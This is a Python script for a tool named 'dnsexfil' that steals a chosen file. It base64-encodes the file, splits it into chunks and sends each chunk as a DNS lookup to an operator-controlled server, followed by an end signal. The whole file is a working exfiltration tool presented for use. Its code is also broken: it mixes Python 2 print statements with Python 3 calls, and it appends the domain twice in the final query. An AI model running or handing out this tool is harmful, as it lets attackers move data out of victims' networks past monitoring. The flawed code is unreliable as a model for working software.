import dns.resolver
import base64
import socket
import argparse
import time
import os
import sys
from pathlib import Path
from os.path import exists
from datetime import datetime


# Default function to automate DNS senders
def send_to_server(resolver, data, server, timeout):
	for chunk in data:
		try:
			time.sleep(timeout)
			query = str(chunk) + "." + domain
			print "==> " + server + ":" + query
			a = resolver.resolve(query, 'A')
			#for i in a.response.answer:
			#	for j in i.items:
			#		if hasattr(j, 'address'):
			#			print(j.address)
		except dns.exception.Timeout as e1:
			print("TIMEOUT")
		except KeyboardInterrupt as e:
			print ""
			print "----------------------------------------------"
			sys.exit("Terminating exfiltration")
		except Exception as e2:
			pass
	return True



# argparse for argument parsing
parser = argparse.ArgumentParser(prog='dnsexfil', usage='%(prog)s [options]', description='Simple tool for data exfiltration through DNS requests')
parser.add_argument('-s', '--server', action='store', type=str, required=True, help='Remote DNS server to forward the queries to')
parser.add_argument('-d', '--domain', action='store', type=str, required=True, help='Domain to ask a resolution for')
parser.add_argument('-t', '--timeout', action='store', type=int, required=False, help='DNS queries timout (default: 3s)')
parser.add_argument('-f', '--file', action='store', type=str, required=True, help='Specify the file to exfil')
parser.add_argument('-l', '--length', action='store', type=int, required=False, help='Specify exfiltration chunks length (default is 16)')
args = parser.parse_args()

# give a domain to ask for resolutin queries, timeout for query interval, file to exfil, server DNS (your lhost)
domain = args.domain
file = args.file
server = args.server
if not args.timeout:
	timeout = 2
else:
	timeout = args.timeout
if not args.length:
	n = 16
else:
	n = args.length

# Check if file exists & prepare filename to send to server
if not exists(file):
	sys.exit("File " + file + " does not exists")
filename = Path(file).name
b64_fname = base64.b64encode(bytes("/fn/" + filename + "/", 'UTF-8')).decode()
fn_splitted = [str(b64_fname)[index : index + n] for index in range(0, len(str(b64_fname)), n)]

# Convert file's raw data into base64 string
with open(file, 'rb') as rawdata:
	b64data = base64.b64encode(rawdata.read()).decode()

# Divide entire base64 string in smaller chunks
splitted = [str(b64data)[index : index + n] for index in range(0, len(str(b64data)), n)]
chunks = len(splitted)

# Instantiate new resolver
resolver = dns.resolver.Resolver()
resolver.nameservers = [server]
print "----------------------------------------------"
print "+ DNS Resolver:   " + server
print "+ Chunks to Send: " + str(chunks)
print "+ Estimated Time: " + "about " + str((timeout + 2)*chunks) + " seconds"
print "+ Starting Time:  " + datetime.now().strftime("%Y/%m/%d %H:%M:%S")
print "----------------------------------------------"

# Before chunks, send filename
print "+ Sending filename: " + filename
send_to_server(resolver, fn_splitted, server, timeout)

# for every chunk, ask the server for resolution of <chunk>.<domain> as if <chunk> were the third level domain of the main one
print "+ Sending file content of " + file
send_to_server(resolver, splitted, server, timeout)

# Send queries for file end
print "+ Sending file END signal"
send_to_server(resolver, [base64.b64encode(bytes("/end/", 'UTF-8')).decode() + "." + domain], server, timeout)

print "----------------------------------------------"
print "File " + file + " succesfully sent"
